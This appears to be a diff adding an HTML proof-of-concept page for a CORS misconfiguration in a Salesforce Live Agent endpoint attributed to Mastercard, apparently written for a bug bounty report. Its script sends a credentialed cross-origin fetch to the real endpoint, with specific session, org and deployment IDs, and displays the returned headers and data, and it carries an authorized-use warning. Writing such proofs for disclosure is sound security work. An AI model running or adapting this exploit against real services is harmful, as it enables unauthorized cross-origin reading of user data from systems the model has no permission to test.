@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mastercard CORS Vulnerability PoC</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        h1, h2 {
+            color: #333;
+        }
+        pre {
+            background-color: #f4f4f4;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+        .response {
+            background-color: #f0f8ff;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-top: 10px;
+            min-height: 100px;
+            white-space: pre-wrap;
+        }
+        button {
+            background-color: #0073b1;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #005a8c;
+        }
+        .warning {
+            color: red;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <h1>Mastercard CORS Misconfiguration Proof of Concept</h1>
+    
+    <p class="warning">IMPORTANT: This PoC is for educational and reporting purposes only. Only use this on domains you are authorized to test under the bug bounty program.</p>
+    
+    <h2>Vulnerability Details</h2>
+    <p>This proof of concept demonstrates a CORS (Cross-Origin Resource Sharing) misconfiguration in Mastercard's Salesforce Live Agent integration. The vulnerable endpoint reflects back any origin in the CORS headers, allowing cross-origin requests from arbitrary domains.</p>
+    
+    <h2>Exploitation</h2>
+    <p>Click the button below to make a cross-origin request to the Salesforce Live Agent endpoint. If successful, the response data will be displayed in the box below, demonstrating that an attacker could exfiltrate data from this endpoint from any domain.</p>
+    
+    <button id="exploitButton">Exploit CORS Misconfiguration</button>
+    
+    <h3>Response:</h3>
+    <div id="response" class="response">Results will appear here...</div>
+    
+    <h2>Technical Details</h2>
+    <pre>
+Endpoint: https://d.la11-core2.sfdc-lywfpd.salesforceliveagent.com/chat/rest/Visitor/Availability.jsonp
+Vulnerability: Server reflects arbitrary origins in the Access-Control-Allow-Origin header
+Impact: Enables data exfiltration and potentially cross-site request forgery attacks
+    </pre>
+    
+    <script>
+        document.getElementById('exploitButton').addEventListener('click', function() {
+            const responseDiv = document.getElementById('response');
+            responseDiv.textContent = 'Making request...';
+            
+            // Create the fetch request with custom headers
+            fetch('https://d.la11-core2.sfdc-lywfpd.salesforceliveagent.com/chat/rest/Visitor/Availability.jsonp?sid=4dee4f05-cd5c-4f54-8b8f-460c4181f781&r=813&Availability.prefix=Visitor&Availability.ids=%5B573020000004C9h%5D&callback=liveagent._.handlePing&deployment_id=5721I000000QWE5&org_id=00D1I000001YKuj&version=53', {
+                method: 'GET',
+                mode: 'cors',
+                credentials: 'include', // Include cookies if available
+                headers: {
+                    'Accept': '*/*',
+                    'Referer': window.location.href
+                }
+            })
+            .then(response => {
+                responseDiv.textContent = '';
+                
+                // Display the CORS headers
+                responseDiv.textContent += 'CORS Headers from Response:\n';
+                responseDiv.textContent += `Access-Control-Allow-Origin: ${response.headers.get('Access-Control-Allow-Origin')}\n`;
+                responseDiv.textContent += `Access-Control-Allow-Credentials: ${response.headers.get('Access-Control-Allow-Credentials')}\n\n`;
+                
+                if (response.ok) {
+                    return response.text().then(text => {
+                        responseDiv.textContent += 'Response Data:\n' + text;
+                        responseDiv.textContent += '\n\nExplanation: The server accepted our cross-origin request and returned data, demonstrating the CORS misconfiguration.';
+                    });
+                } else {
+                    responseDiv.textContent += `Error: ${response.status} - ${response.statusText}\n`;
+                    responseDiv.textContent += 'This may still demonstrate the vulnerability if the CORS headers were returned, but access was denied for other reasons.';
+                }
+            })
+            .catch(error => {
+                responseDiv.textContent = `Error: ${error.message}\n\n`;
+                responseDiv.textContent += 'If you see a CORS error in the browser console, this actually demonstrates the browser\'s security mechanism working correctly, but does not mean the server is properly configured. To fully verify this vulnerability, check the network tab in developer tools to see the response headers.';
+            });
+        });
+    </script>
+</body>
+</html>
